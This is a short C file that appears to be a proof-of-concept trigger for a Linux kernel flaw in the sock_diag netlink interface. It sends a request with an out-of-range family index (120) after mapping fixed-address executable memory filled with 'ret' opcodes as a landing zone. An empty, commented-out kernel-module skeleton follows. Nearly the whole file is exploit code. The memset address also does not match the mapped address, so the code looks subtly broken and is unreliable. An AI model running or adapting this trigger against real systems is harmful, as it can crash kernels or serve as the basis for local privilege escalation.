#include <stdio.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <linux/sock_diag.h>
#include <sys/mman.h>
#include <string.h>
int sock_fd;
static const struct sock_diag_handler *sock_diag_handlers[41];

struct {
	struct nlmsghdr nlh;
	struct sock_diag_req r;
} req = {
	.nlh = {
	.nlmsg_len = sizeof(req),
	.nlmsg_type = SOCK_DIAG_BY_FAMILY,
	.nlmsg_flags = NLM_F_ROOT | NLM_F_MATCH | NLM_F_REQUEST,
	.nlmsg_seq = 123456,
},
};


int main(int argc, char *argv[])
{
	char buffer[255];
	
	sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG);
	if(sock_fd < 0)
		return -1;
	printf("socket made\n");
	req.r.sdiag_family= 120;

	mmap((void*)0x0000000100000000, 0x2000000,
		PROT_WRITE | PROT_READ | PROT_EXEC,
		MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);

	memset((void*)0x000000010000000, 0xc3, 0x2000000);
	
	send(sock_fd, &req , sizeof(req), 0);
		
	
}

/*#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/atomic.h>
#include <linux/bitops.h>
#include <linux/slab.h>
#include <linux/spinlock.h>


static int my_init(void)
{



	return 0;
}


static void my_exit(void)
{
	
}

int main(int argc, char *argv[])
{


	return 0;
}

module_init(my_init);
module_exit(my_exit);

MODULE_LICENSE("GPL");*/
